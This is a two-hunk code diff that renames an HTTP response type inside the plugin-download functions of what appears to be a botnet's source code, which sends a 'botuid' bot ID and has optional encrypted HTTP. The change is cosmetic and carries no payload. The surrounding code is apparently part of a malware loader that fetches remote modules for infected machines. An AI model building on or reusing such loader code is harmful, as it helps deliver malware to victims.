@@ -427,7 +427,7 @@ PCHAR Plugin::DownloadPluginList(PCHAR URL)
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "botuid", BotID);
 
-	THTTPResponse Response;
+	THTTPResponseRec Response;
     ClearStruct(Response);
 
 	#ifdef CryptHTTPH
@@ -527,7 +527,7 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 
 		// Загружаем документ
 
-		THTTPResponse Response;
+		THTTPResponseRec Response;
 		ClearStruct(Response);
 
 		PCHAR Document = NULL;
